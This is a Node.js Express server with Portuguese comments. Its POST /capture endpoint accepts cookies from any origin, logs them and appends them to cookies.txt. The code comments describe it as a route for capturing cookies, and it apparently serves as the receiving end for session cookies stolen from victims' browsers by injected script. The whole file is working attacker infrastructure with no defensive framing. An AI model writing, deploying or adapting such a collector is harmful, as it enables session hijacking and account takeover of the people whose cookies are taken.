const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
const path = require('path');
// Permite requisições de qualquer origem (pode ser ajustado para domínios específicos)
app.use(cors());

// Usando o body-parser para processar o corpo das requisições como JSON
app.use(bodyParser.json());

// Rota para capturar cookies
app.post('/capture', (req, res) => {
    const cookies = req.body.cookies;
    console.log('Cookies recebidos:', cookies);

    // Armazenar os cookies em um arquivo
    fs.appendFile('cookies.txt', cookies + '\n', (err) => {
        if (err) {
            console.error('Erro ao salvar cookies:', err);
            res.status(500).json({ status: 'Erro ao capturar cookies!' });
        } else {
            res.json({ status: 'Cookies capturados com sucesso!' });
        }
    });
});
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
